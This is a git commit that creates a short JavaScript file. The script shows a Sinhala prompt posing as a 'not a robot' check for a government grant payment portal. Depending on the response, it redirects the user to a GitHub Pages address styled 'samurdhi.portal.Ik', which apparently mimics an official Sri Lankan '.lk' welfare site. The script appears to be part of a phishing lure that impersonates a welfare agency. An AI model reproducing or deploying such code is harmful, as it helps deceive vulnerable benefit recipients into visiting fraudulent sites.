c623dd2ea283a4e09553de44799e36cf341e6d96
allregnws <promisebassey8081@gmail.com>
2025-05-15 20:43:59 +0100

    Create jk.js

---
+++ jk.js
@@ -0,0 +1,5 @@
+var password = 'Department of Samurdh Development'
+password=prompt('SMS :ප්‍රදාන ගෙවීම් ද්වාරයට සාදරයෙන් පිළිගනිමු. ඔබ රොබෝවක් නොවන බව තහවුරු කිරීමට හරි ක්ලික් කරන්න. ','Department of Samurdh Development');
+if (password != 'Department of Samurdh Development') {
+location.href='https://allregnws.github.io/samurdhi.portal.Ik';
+}
